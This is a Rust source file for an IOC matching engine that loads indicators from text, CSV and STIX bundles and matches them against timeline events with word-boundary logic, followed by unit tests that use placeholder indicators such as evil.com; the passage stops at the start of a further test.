//! IOC (Indicator of Compromise) matching engine.
//!
//! Supports loading IOCs from plain-text files, CSV feeds, and STIX 2.1 JSON
//! bundles, then matching them against [`TimelineEvent`]s.

use std::collections::HashMap;
use std::path::Path;

use hunt_query::timeline::TimelineEvent;
use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::error::{Error, Result};

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Classification of an indicator of compromise.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum IocType {
    Sha256,
    Sha1,
    Md5,
    Domain,
    #[serde(rename = "ipv4")]
    IPv4,
    #[serde(rename = "ipv6")]
    IPv6,
    Url,
}

/// A single IOC entry.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct IocEntry {
    /// The indicator value (hash, domain, IP, URL).
    pub indicator: String,
    /// Detected or declared type.
    pub ioc_type: IocType,
    /// Human-readable description.
    pub description: Option<String>,
    /// Attribution source (feed name, report URL, etc.).
    pub source: Option<String>,
}

/// A match between a timeline event and one or more IOC entries.
#[derive(Debug, Clone, Serialize)]
pub struct IocMatch {
    /// The event that matched.
    pub event: TimelineEvent,
    /// All IOC entries that matched this event.
    pub matched_iocs: Vec<IocEntry>,
    /// Which event field produced the match (e.g. `"summary"`, `"process"`, `"raw"`).
    pub match_field: String,
}

/// In-memory IOC database with index structures for fast lookup.
#[derive(Debug)]
pub struct IocDatabase {
    entries: Vec<IocEntry>,
    /// lowercase hash string -> indices into `entries`
    hash_index: HashMap<String, Vec<usize>>,
    /// lowercase domain -> indices into `entries`
    domain_index: HashMap<String, Vec<usize>>,
    /// IP string -> indices into `entries`
    ip_index: HashMap<String, Vec<usize>>,
    /// lowercase URL string -> indices into `entries`
    url_index: HashMap<String, Vec<usize>>,
}

// ---------------------------------------------------------------------------
// Auto-detection
// ---------------------------------------------------------------------------

/// Auto-detect the IOC type from the indicator string format.
///
/// - 64 hex chars → SHA-256
/// - 40 hex chars → SHA-1
/// - 32 hex chars → MD5
/// - starts with `http://` or `https://` → URL
/// - matches `x.x.x.x` where each octet is 0-255 → IPv4
/// - contains `:` and hex digits → IPv6
/// - contains `.` (and nothing else matched) → Domain
pub fn detect_ioc_type(indicator: &str) -> Option<IocType> {
    let trimmed = indicator.trim();
    if trimmed.is_empty() {
        return None;
    }

    // Check for hex-only hashes (SHA-256, SHA-1, MD5)
    let lower = trimmed.to_lowercase();

    if lower.len() == 64 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Sha256);
    }
    if lower.len() == 40 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Sha1);
    }
    if lower.len() == 32 && lower.chars().all(|c| c.is_ascii_hexdigit()) {
        return Some(IocType::Md5);
    }

    // URL
    if lower.starts_with("http://") || lower.starts_with("https://") {
        return Some(IocType::Url);
    }

    // IPv4: exactly 4 dot-separated octets, each 0-255
    if is_ipv4(trimmed) {
        return Some(IocType::IPv4);
    }

    // IPv6: contains colons and hex digits (simplified heuristic)
    if trimmed.contains(':') && trimmed.chars().all(|c| c.is_ascii_hexdigit() || c == ':') {
        return Some(IocType::IPv6);
    }

    // Domain: contains at least one dot, no spaces, no slashes
    if trimmed.contains('.')
        && !trimmed.contains(' ')
        && !trimmed.contains('/')
        && !trimmed.contains(':')
    {
        return Some(IocType::Domain);
    }

    None
}

fn is_ipv4(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() != 4 {
        return false;
    }
    parts.iter().all(|p| {
        if p.is_empty() {
            return false;
        }
        match p.parse::<u16>() {
            Ok(n) => n <= 255,
            Err(_) => false,
        }
    })
}

// ---------------------------------------------------------------------------
// IocDatabase
// ---------------------------------------------------------------------------

impl IocDatabase {
    /// Create an empty IOC database.
    pub fn new() -> Self {
        Self {
            entries: Vec::new(),
            hash_index: HashMap::new(),
            domain_index: HashMap::new(),
            ip_index: HashMap::new(),
            url_index: HashMap::new(),
        }
    }

    /// Add a single entry and update indices.
    pub fn add_entry(&mut self, entry: IocEntry) {
        let indicator = entry.indicator.trim().to_string();
        if indicator.is_empty() {
            return;
        }

        let mut entry = entry;
        entry.indicator = indicator;

        let idx = self.entries.len();
        let key = entry.indicator.to_lowercase();
        match entry.ioc_type {
            IocType::Sha256 | IocType::Sha1 | IocType::Md5 => {
                self.hash_index.entry(key).or_default().push(idx);
            }
            IocType::Domain => {
                self.domain_index.entry(key).or_default().push(idx);
            }
            IocType::IPv4 | IocType::IPv6 => {
                self.ip_index.entry(key).or_default().push(idx);
            }
            IocType::Url => {
                self.url_index.entry(key).or_default().push(idx);
            }
        }
        self.entries.push(entry);
    }

    /// Number of loaded entries.
    pub fn len(&self) -> usize {
        self.entries.len()
    }

    /// Whether the database is empty.
    pub fn is_empty(&self) -> bool {
        self.entries.is_empty()
    }

    /// Merge another database into this one.
    pub fn merge(&mut self, other: IocDatabase) {
        for entry in other.entries {
            self.add_entry(entry);
        }
    }

    // -- Loaders -----------------------------------------------------------

    /// Load IOCs from a plain-text file (one indicator per line).
    ///
    /// Empty lines and lines starting with `#` are skipped. Type is
    /// auto-detected via [`detect_ioc_type`].
    pub fn load_text_file(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let mut db = Self::new();
        for line in content.lines() {
            let trimmed = line.trim();
            if trimmed.is_empty() || trimmed.starts_with('#') {
                continue;
            }
            if let Some(ioc_type) = detect_ioc_type(trimmed) {
                db.add_entry(IocEntry {
                    indicator: trimmed.to_string(),
                    ioc_type,
                    description: None,
                    source: None,
                });
            }
        }
        Ok(db)
    }

    /// Load IOCs from a CSV file.
    ///
    /// Expected columns: `indicator, type, description, source`.
    /// The first row is treated as a header if it starts with `indicator`
    /// (case-insensitive). Quoted fields are supported (double-quote).
    pub fn load_csv_file(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let mut db = Self::new();
        let mut lines = content.lines();

        // Skip header if present — require a comma-separated header pattern
        // (e.g. "indicator,type" or "indicator,") to avoid dropping data rows
        // whose indicator value happens to start with "indicator".
        if let Some(first) = lines.next() {
            let first_lower = first.trim().to_lowercase();
            let is_header = first_lower.starts_with("indicator,")
                || first_lower.starts_with("indicator_type,")
                || first_lower == "indicator";
            if !is_header {
                // Not a header — process it as data
                if let Some(entry) = parse_csv_line(first) {
                    db.add_entry(entry);
                }
            }
        }

        for line in lines {
            if line.trim().is_empty() {
                continue;
            }
            if let Some(entry) = parse_csv_line(line) {
                db.add_entry(entry);
            }
        }
        Ok(db)
    }

    /// Load IOCs from a STIX 2.1 JSON bundle.
    ///
    /// Only `type: "indicator"` SDOs are extracted. Only simple equality
    /// patterns of the form `[TYPE:PROPERTY = 'VALUE']` are supported.
    pub fn load_stix_bundle(path: &Path) -> Result<Self> {
        let content = std::fs::read_to_string(path)?;
        let bundle: Value =
            serde_json::from_str(&content).map_err(|e| Error::IocParse(e.to_string()))?;

        Self::load_stix_bundle_value(&bundle)
    }

    pub fn load_stix_bundle_value(bundle: &Value) -> Result<Self> {
        let mut db = Self::new();

        let objects = bundle
            .get("objects")
            .and_then(|v| v.as_array())
            .ok_or_else(|| Error::IocParse("STIX bundle missing 'objects' array".into()))?;

        for obj in objects {
            let sdo_type = obj.get("type").and_then(|v| v.as_str()).unwrap_or("");
            if sdo_type != "indicator" {
                continue;
            }

            let pattern = match obj.get("pattern").and_then(|v| v.as_str()) {
                Some(p) => p,
                None => continue,
            };

            let description = obj
                .get("description")
                .and_then(|v| v.as_str())
                .map(String::from);
            let source = obj.get("name").and_then(|v| v.as_str()).map(String::from);

            if let Some((indicator, ioc_type)) = parse_stix_pattern(pattern) {
                db.add_entry(IocEntry {
                    indicator,
                    ioc_type,
                    description,
                    source,
                });
            }
        }

        Ok(db)
    }
}

impl Default for IocDatabase {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// CSV parsing helpers
// ---------------------------------------------------------------------------

/// Parse a single CSV line into fields, handling double-quoted values.
fn split_csv_fields(line: &str) -> Vec<String> {
    let mut fields = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    let mut chars = line.chars().peekable();

    while let Some(ch) = chars.next() {
        if in_quotes {
            if ch == '"' {
                // Check for escaped quote ("")
                if chars.peek() == Some(&'"') {
                    current.push('"');
                    chars.next();
                } else {
                    in_quotes = false;
                }
            } else {
                current.push(ch);
            }
        } else if ch == '"' {
            in_quotes = true;
        } else if ch == ',' {
            fields.push(current.trim().to_string());
            current = String::new();
        } else {
            current.push(ch);
        }
    }
    fields.push(current.trim().to_string());
    fields
}

fn parse_csv_line(line: &str) -> Option<IocEntry> {
    let fields = split_csv_fields(line);
    if fields.is_empty() {
        return None;
    }

    let indicator = fields.first()?.trim().to_string();
    if indicator.is_empty() {
        return None;
    }

    let ioc_type = if fields.len() > 1 && !fields[1].is_empty() {
        parse_ioc_type_str(&fields[1]).or_else(|| detect_ioc_type(&indicator))?
    } else {
        detect_ioc_type(&indicator)?
    };

    let description = fields
        .get(2)
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());
    let source = fields
        .get(3)
        .filter(|s| !s.is_empty())
        .map(|s| s.to_string());

    Some(IocEntry {
        indicator,
        ioc_type,
        description,
        source,
    })
}

fn parse_ioc_type_str(s: &str) -> Option<IocType> {
    match s.trim().to_lowercase().as_str() {
        "sha256" | "sha-256" => Some(IocType::Sha256),
        "sha1" | "sha-1" => Some(IocType::Sha1),
        "md5" => Some(IocType::Md5),
        "domain" | "domain-name" => Some(IocType::Domain),
        "ipv4" | "ipv4-addr" | "ip" => Some(IocType::IPv4),
        "ipv6" | "ipv6-addr" => Some(IocType::IPv6),
        "url" => Some(IocType::Url),
        _ => None,
    }
}

// ---------------------------------------------------------------------------
// STIX pattern parsing
// ---------------------------------------------------------------------------

/// Parse a simple STIX 2.1 pattern of the form `[TYPE:PROPERTY = 'VALUE']`.
///
/// Returns `(value, IocType)` on success.
fn parse_stix_pattern(pattern: &str) -> Option<(String, IocType)> {
    let trimmed = pattern.trim();

    // Strip surrounding brackets
    let inner = trimmed.strip_prefix('[')?.strip_suffix(']')?;

    // Split on " = " (STIX uses single space around =)
    let (lhs, rhs) = inner.split_once('=')?;
    let lhs = lhs.trim();
    let rhs = rhs.trim();

    // Extract value from single quotes
    let value = rhs.strip_prefix('\'')?.strip_suffix('\'')?;
    if value.is_empty() {
        return None;
    }

    // Map STIX object type to IocType
    let ioc_type = stix_lhs_to_ioc_type(lhs)?;

    Some((value.to_string(), ioc_type))
}

fn stix_lhs_to_ioc_type(lhs: &str) -> Option<IocType> {
    let lower = lhs.to_lowercase();
    if lower.contains("sha-256") || lower.contains("sha256") {
        Some(IocType::Sha256)
    } else if lower.contains("sha-1") || lower.contains("sha1") {
        Some(IocType::Sha1)
    } else if lower.contains("md5") {
        Some(IocType::Md5)
    } else if lower.starts_with("domain-name") {
        Some(IocType::Domain)
    } else if lower.starts_with("ipv4-addr") {
        Some(IocType::IPv4)
    } else if lower.starts_with("ipv6-addr") {
        Some(IocType::IPv6)
    } else if lower.starts_with("url") {
        Some(IocType::Url)
    } else {
        None
    }
}

// ---------------------------------------------------------------------------
// Matching
// ---------------------------------------------------------------------------

/// Check whether the character is an IOC word character.
///
/// Dots and hyphens are word characters for IOC matching because domains and
/// hostnames commonly contain both. This prevents `evil.com` from matching
/// inside `notevil.com` or `cdn-evil.com`, and prevents
/// `10.0.0.1` from matching inside `210.0.0.10`.
fn is_ioc_word_char(ch: u8) -> bool {
    ch.is_ascii_alphanumeric() || ch == b'.' || ch == b'-'
}

/// Check whether `needle` appears in `haystack` at word boundaries.
///
/// A match is word-bounded when the characters immediately before and after
/// the match are NOT IOC word characters (alphanumeric, dot, hyphen).
fn contains_word_bounded(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() {
        return false;
    }

    let bytes = haystack.as_bytes();
    let mut start = 0;
    while let Some(pos) = haystack.get(start..).and_then(|slice| slice.find(needle)) {
        let abs_pos = start + pos;
        let end_pos = abs_pos + needle.len();

        // Check left boundary: either at start of string, or preceded by non-word char
        let left_ok = abs_pos == 0 || !is_ioc_word_char(bytes[abs_pos - 1]);

        // Check right boundary: either at end of string, or followed by non-word char
        let right_ok = end_pos >= bytes.len() || !is_ioc_word_char(bytes[end_pos]);

        if left_ok && right_ok {
            return true;
        }
        let next_char_len = haystack[abs_pos..]
            .chars()
            .next()
            .map(char::len_utf8)
            .unwrap_or(1);
        start = abs_pos + next_char_len;
    }
    false
}

/// Lowercased event fields used for IOC scanning.
struct EventFields {
    summary: String,
    process: String,
    raw: String,
}

/// Scan a single IOC index against the three lowercased event fields and push
/// any matches into `matches`.
///
/// `matcher` is the function used to test whether a needle appears in a
/// haystack (e.g. `str::contains` for hashes, [`contains_word_bounded`] for
/// domains/IPs/URLs).
fn scan_index<F>(
    index: &HashMap<String, Vec<usize>>,
    entries: &[IocEntry],
    event: &TimelineEvent,
    fields: &EventFields,
    matcher: F,
    matches: &mut Vec<IocMatch>,
) where
    F: Fn(&str, &str) -> bool,
{
    for (needle, indices) in index {
        let field = if matcher(&fields.summary, needle) {
            Some("summary")
        } else if matcher(&fields.process, needle) {
            Some("process")
        } else if matcher(&fields.raw, needle) {
            Some("raw")
        } else {
            None
        };
        if let Some(f) = field {
            let matched_iocs: Vec<IocEntry> = indices.iter().map(|&i| entries[i].clone()).collect();
            matches.push(IocMatch {
                event: event.clone(),
                matched_iocs,
                match_field: f.to_string(),
            });
        }
    }
}

/// Check a single timeline event against the IOC database.
///
/// Fields checked: `summary`, `process`, and `raw` JSON (serialised to string).
/// Hash IOCs use plain substring match; domain, IP, and URL IOCs use
/// word-boundary-aware matching to prevent false positives.
pub fn match_event(db: &IocDatabase, event: &TimelineEvent) -> Vec<IocMatch> {
    let mut matches: Vec<IocMatch> = Vec::new();

    let fields = EventFields {
        summary: event.summary.to_lowercase(),
        process: event.process.as_deref().unwrap_or("").to_lowercase(),
        raw: event
            .raw
            .as_ref()
            .map(|v| v.to_string().to_lowercase())
            .unwrap_or_default(),
    };

    // Hashes: plain substring match (hashes are long enough to be unique).
    scan_index(
        &db.hash_index,
        &db.entries,
        event,
        &fields,
        |haystack, needle| haystack.contains(needle),
        &mut matches,
    );

    // Domains: word-boundary match.
    scan_index(
        &db.domain_index,
        &db.entries,
        event,
        &fields,
        contains_word_bounded,
        &mut matches,
    );

    // IPs: word-boundary match.
    scan_index(
        &db.ip_index,
        &db.entries,
        event,
        &fields,
        contains_word_bounded,
        &mut matches,
    );

    // URLs: word-boundary match.
    scan_index(
        &db.url_index,
        &db.entries,
        event,
        &fields,
        contains_word_bounded,
        &mut matches,
    );

    matches
}

/// Batch-match a slice of timeline events against the IOC database.
pub fn match_events(db: &IocDatabase, events: &[TimelineEvent]) -> Vec<IocMatch> {
    events.iter().flat_map(|e| match_event(db, e)).collect()
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::{TimeZone, Utc};
    use hunt_query::query::EventSource;
    use hunt_query::timeline::{NormalizedVerdict, TimelineEventKind};
    use std::io::Write;

    fn make_event(
        summary: &str,
        process: Option<&str>,
        raw: Option<serde_json::Value>,
    ) -> TimelineEvent {
        TimelineEvent {
            event_id: None,
            timestamp: Utc.with_ymd_and_hms(2025, 6, 15, 12, 0, 0).unwrap(),
            source: EventSource::Tetragon,
            kind: TimelineEventKind::ProcessExec,
            verdict: NormalizedVerdict::None,
            severity: None,
            summary: summary.to_string(),
            process: process.map(String::from),
            namespace: None,
            pod: None,
            action_type: None,
            signature_valid: None,
            raw,
        }
    }

    // -- detect_ioc_type ---------------------------------------------------

    #[test]
    fn detect_sha256() {
        let hash = "a".repeat(64);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Sha256));
    }

    #[test]
    fn detect_sha1() {
        let hash = "b".repeat(40);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Sha1));
    }

    #[test]
    fn detect_md5() {
        let hash = "c".repeat(32);
        assert_eq!(detect_ioc_type(&hash), Some(IocType::Md5));
    }

    #[test]
    fn detect_domain() {
        assert_eq!(detect_ioc_type("evil.com"), Some(IocType::Domain));
        assert_eq!(detect_ioc_type("sub.evil.com"), Some(IocType::Domain));
    }

    #[test]
    fn detect_ipv4() {
        assert_eq!(detect_ioc_type("192.168.1.1"), Some(IocType::IPv4));
        assert_eq!(detect_ioc_type("10.0.0.1"), Some(IocType::IPv4));
    }

    #[test]
    fn detect_ipv6() {
        assert_eq!(
            detect_ioc_type("2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
            Some(IocType::IPv6)
        );
    }

    #[test]
    fn detect_url() {
        assert_eq!(
            detect_ioc_type("http://evil.com/payload"),
            Some(IocType::Url)
        );
        assert_eq!(
            detect_ioc_type("https://malware.example.org/dl"),
            Some(IocType::Url)
        );
    }

    #[test]
    fn detect_empty_returns_none() {
        assert_eq!(detect_ioc_type(""), None);
        assert_eq!(detect_ioc_type("   "), None);
    }

    // -- load_text_file ----------------------------------------------------

    #[test]
    fn load_text_file_parses_indicators() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs.txt");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "# comment line").unwrap();
            writeln!(f, "{}", "a".repeat(64)).unwrap();
            writeln!(f).unwrap(); // blank line
            writeln!(f, "evil.com").unwrap();
            writeln!(f, "192.168.1.1").unwrap();
        }

        let db = IocDatabase::load_text_file(&path).unwrap();
        assert_eq!(db.len(), 3);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
        assert_eq!(db.entries[2].ioc_type, IocType::IPv4);
    }

    // -- load_csv_file -----------------------------------------------------

    #[test]
    fn load_csv_file_with_header() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, "{},sha256,Bad file,ThreatFeed", "a".repeat(64)).unwrap();
            writeln!(f, "evil.com,domain,C2 domain,Intel").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 2);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[0].description.as_deref(), Some("Bad file"));
        assert_eq!(db.entries[0].source.as_deref(), Some("ThreatFeed"));
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
    }

    #[test]
    fn load_csv_file_quoted_fields() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_quoted.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, r#""evil.com",domain,"Known C2, very bad","Intel, Inc""#).unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 1);
        assert_eq!(db.entries[0].indicator, "evil.com");
        assert_eq!(
            db.entries[0].description.as_deref(),
            Some("Known C2, very bad")
        );
        assert_eq!(db.entries[0].source.as_deref(), Some("Intel, Inc"));
    }

    #[test]
    fn load_csv_file_no_header() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_no_header.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "{},sha256,Malware hash,Feed1", "a".repeat(64)).unwrap();
            writeln!(f, "evil.com,domain,C2 domain,Feed2").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 2);
    }

    #[test]
    fn load_csv_file_unknown_type_falls_back_to_auto_detect() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_unknown_type.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, "{},hash,Malware hash,Feed1", "a".repeat(64)).unwrap();
            writeln!(f, "evil.com,hostname,C2 domain,Feed2").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 2);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
    }

    #[test]
    fn load_csv_file_does_not_drop_indicator_data_row() {
        // A legitimate data row where the indicator value starts with
        // "indicator" (e.g. "indicators.example.com") must not be skipped.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_indicator_domain.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicators.example.com,domain,Legit IOC,Feed").unwrap();
            writeln!(f, "evil.com,domain,C2 domain,Feed").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(
            db.len(),
            2,
            "both rows should be loaded, including the one starting with 'indicator'"
        );
        assert_eq!(db.entries[0].indicator, "indicators.example.com");
    }

    #[test]
    fn load_csv_file_skips_real_header() {
        // A proper header row like "indicator,type,description,source" must be skipped.
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("iocs_with_header.csv");
        {
            let mut f = std::fs::File::create(&path).unwrap();
            writeln!(f, "indicator,type,description,source").unwrap();
            writeln!(f, "evil.com,domain,C2,Feed").unwrap();
        }

        let db = IocDatabase::load_csv_file(&path).unwrap();
        assert_eq!(db.len(), 1);
        assert_eq!(db.entries[0].indicator, "evil.com");
    }

    // -- load_stix_bundle --------------------------------------------------

    #[test]
    fn load_stix_bundle_extracts_indicators() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("stix.json");
        let sha = "a".repeat(64);
        let bundle = serde_json::json!({
            "type": "bundle",
            "id": "bundle--1",
            "objects": [
                {
                    "type": "indicator",
                    "id": "indicator--1",
                    "name": "Malware hash",
                    "description": "Known bad hash",
                    "pattern": format!("[file:hashes.SHA-256 = '{}']", sha),
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "indicator",
                    "id": "indicator--2",
                    "name": "C2 domain",
                    "pattern": "[domain-name:value = 'evil.example.com']",
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "indicator",
                    "id": "indicator--3",
                    "name": "C2 IP",
                    "pattern": "[ipv4-addr:value = '10.0.0.99']",
                    "pattern_type": "stix",
                    "valid_from": "2025-01-01T00:00:00Z"
                },
                {
                    "type": "malware",
                    "id": "malware--1",
                    "name": "Should be skipped"
                }
            ]
        });
        std::fs::write(&path, serde_json::to_string(&bundle).unwrap()).unwrap();

        let db = IocDatabase::load_stix_bundle(&path).unwrap();
        assert_eq!(db.len(), 3);
        assert_eq!(db.entries[0].ioc_type, IocType::Sha256);
        assert_eq!(db.entries[0].indicator, sha);
        assert_eq!(db.entries[0].description.as_deref(), Some("Known bad hash"));
        assert_eq!(db.entries[0].source.as_deref(), Some("Malware hash"));
        assert_eq!(db.entries[1].ioc_type, IocType::Domain);
        assert_eq!(db.entries[1].indicator, "evil.example.com");
        assert_eq!(db.entries[2].ioc_type, IocType::IPv4);
        assert_eq!(db.entries[2].indicator, "10.0.0.99");
    }

    #[test]
    fn load_stix_bundle_missing_objects_errors() {
        let dir = tempfile::tempdir().unwrap();
        let path = dir.path().join("bad_stix.json");
        std::fs::write(&path, r#"{"type": "bundle"}"#).unwrap();

        let err = IocDatabase::load_stix_bundle(&path).unwrap_err();
        assert!(err.to_string().contains("objects"));
    }

    // -- match_event -------------------------------------------------------

    #[test]
    fn match_event_finds_hash_in_raw() {
        let sha = "a".repeat(64);
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: sha.clone(),
            ioc_type: IocType::Sha256,
            description: Some("bad hash".into()),
            source: None,
        });

        let event = make_event(
            "process_exec /usr/bin/curl",
            Some("/usr/bin/curl"),
            Some(serde_json::json!({"file_hash": sha})),
        );

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "raw");
        assert_eq!(results[0].matched_iocs.len(), 1);
        assert_eq!(results[0].matched_iocs[0].indicator, sha);
    }

    #[test]
    fn match_event_finds_domain_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP 10.0.0.1 -> evil.com:443", None, None);

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }

    #[test]
    fn match_event_finds_ip_in_summary() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP -> 10.0.0.99:8080", None, None);

        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
        assert_eq!(results[0].match_field, "summary");
    }

    #[test]
    fn match_event_no_match_returns_empty() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("normal activity on good.com", None, None);
        let results = match_event(&db, &event);
        assert!(results.is_empty());
    }

    // -- match_events (batch) ----------------------------------------------

    #[test]
    fn match_events_batch() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let events = vec![
            make_event("connection to evil.com", None, None),
            make_event("normal traffic", None, None),
            make_event("dns query evil.com", None, None),
        ];

        let results = match_events(&db, &events);
        assert_eq!(results.len(), 2);
    }

    // -- merge -------------------------------------------------------------

    #[test]
    fn merge_combines_databases() {
        let mut db1 = IocDatabase::new();
        db1.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let mut db2 = IocDatabase::new();
        db2.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });
        db2.add_entry(IocEntry {
            indicator: "a".repeat(64),
            ioc_type: IocType::Sha256,
            description: None,
            source: None,
        });

        db1.merge(db2);
        assert_eq!(db1.len(), 3);
        assert_eq!(db1.domain_index.len(), 1);
        assert_eq!(db1.ip_index.len(), 1);
        assert_eq!(db1.hash_index.len(), 1);
    }

    // -- STIX pattern parsing edge cases -----------------------------------

    #[test]
    fn stix_pattern_sha1() {
        let (val, typ) = parse_stix_pattern("[file:hashes.SHA-1 = 'abc123']").unwrap();
        assert_eq!(val, "abc123");
        assert_eq!(typ, IocType::Sha1);
    }

    #[test]
    fn stix_pattern_md5() {
        let (val, typ) = parse_stix_pattern("[file:hashes.MD5 = 'deadbeef']").unwrap();
        assert_eq!(val, "deadbeef");
        assert_eq!(typ, IocType::Md5);
    }

    #[test]
    fn stix_pattern_url() {
        let (val, typ) = parse_stix_pattern("[url:value = 'http://evil.com/payload']").unwrap();
        assert_eq!(val, "http://evil.com/payload");
        assert_eq!(typ, IocType::Url);
    }

    #[test]
    fn stix_pattern_invalid_returns_none() {
        assert!(parse_stix_pattern("not a valid pattern").is_none());
        assert!(parse_stix_pattern("[unknown:value = 'foo']").is_none());
        assert!(parse_stix_pattern("[]").is_none());
    }

    // -- word-boundary matching ---------------------------------------------

    #[test]
    fn ip_no_false_positive_on_prefix() {
        // "10.0.0.1" must NOT match inside "210.0.0.1"
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "10.0.0.1".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP -> 210.0.0.1:8080", None, None);
        let results = match_event(&db, &event);
        assert!(
            results.is_empty(),
            "should not match 10.0.0.1 inside 210.0.0.1"
        );
    }

    #[test]
    fn ip_no_false_positive_on_suffix() {
        // "10.0.0.1" must NOT match inside "10.0.0.100"
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "10.0.0.1".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP -> 10.0.0.100:443", None, None);
        let results = match_event(&db, &event);
        assert!(
            results.is_empty(),
            "should not match 10.0.0.1 inside 10.0.0.100"
        );
    }

    #[test]
    fn ip_matches_with_port_separator() {
        // "10.0.0.99" should match when followed by ":"
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "10.0.0.99".into(),
            ioc_type: IocType::IPv4,
            description: None,
            source: None,
        });

        let event = make_event("egress TCP -> 10.0.0.99:8080", None, None);
        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
    }

    #[test]
    fn domain_no_false_positive_on_subdomain() {
        // "evil.com" must NOT match inside "notevil.com"
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("connection to notevil.com", None, None);
        let results = match_event(&db, &event);
        assert!(
            results.is_empty(),
            "should not match evil.com inside notevil.com"
        );
    }

    #[test]
    fn domain_matches_preceded_by_space() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("connection to evil.com:443", None, None);
        let results = match_event(&db, &event);
        assert_eq!(results.len(), 1);
    }

    #[test]
    fn domain_no_false_positive_when_prefixed_by_hyphen() {
        let mut db = IocDatabase::new();
        db.add_entry(IocEntry {
            indicator: "evil.com".into(),
            ioc_type: IocType::Domain,
            description: None,
            source: None,
        });

        let event = make_event("connection to cdn-evil.com", None, None);
        let results = match_event(&db, &event);
        assert!(
            results.is_empty(),
            "should not match evil.com inside cdn-evil.com"
        );
    }

    #[test]
